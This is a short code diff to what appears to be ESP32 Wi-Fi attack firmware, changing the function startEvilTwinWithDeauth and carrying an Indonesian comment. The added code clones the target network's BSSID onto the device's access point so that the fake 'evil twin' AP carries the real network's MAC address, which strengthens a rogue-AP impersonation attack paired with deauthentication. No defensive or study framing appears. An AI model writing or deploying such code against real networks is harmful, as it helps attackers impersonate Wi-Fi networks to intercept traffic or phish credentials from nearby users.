@@ -797,7 +797,15 @@ String getBestDiscoveredSSID() {
 void startEvilTwinWithDeauth() {
   radioSetMode(RADIO_AP_STA);
   delay(100);
-  restoreOriginalApMac();
+  // Clone BSSID target agar AP palsu benar-benar "twin" (bukan MAC original).
+  if (g_targetBSSID[0] != 0 || g_targetBSSID[1] != 0 || g_targetBSSID[2] != 0 ||
+      g_targetBSSID[3] != 0 || g_targetBSSID[4] != 0 || g_targetBSSID[5] != 0) {
+    esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
+    if (macErr != ESP_OK) {
+      Serial.printf("[WARN] clone MAC target gagal (%d), pakai MAC existing\n", macErr);
+    }
+    delay(50);
+  }
 
   String safeSSID = targetSSID;
   if (safeSSID.length() == 0) {
